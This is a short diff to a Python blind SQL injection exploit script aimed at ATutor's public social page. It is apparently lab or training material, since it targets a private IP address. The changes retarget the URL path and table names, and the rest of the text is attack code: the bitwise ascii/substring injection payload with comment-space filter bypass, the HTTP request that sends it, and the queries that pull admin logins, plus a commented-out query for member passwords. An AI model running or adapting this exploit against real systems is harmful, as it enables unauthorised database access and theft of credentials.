@@ -17,7 +17,7 @@ def inject(inj, ip):
 		 	injection_string = "test'/**/or/**/(ascii((substring((%s),%s,1)))>>%s)=%s/**/or/**/1='" % (inj,j,i,value)
 
 
-		 	target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" %(ip,injection_string)
+		 	target = "http://%s/index_public.php?q=%s" %(ip,injection_string)
 
 		 	r = requests.get(target,proxies=proxies)
 
@@ -52,7 +52,7 @@ def main():
   
     ip = "192.168.137.103"
     print "(+) Retrieving username...."
-    query = "select/**/login/**/from/**/AT_admins"
+    query = "select/**/login/**/from/**/admins"
     #query = "select/**/password/**/from/**/AT_members"
     username = inject(query, ip)
 
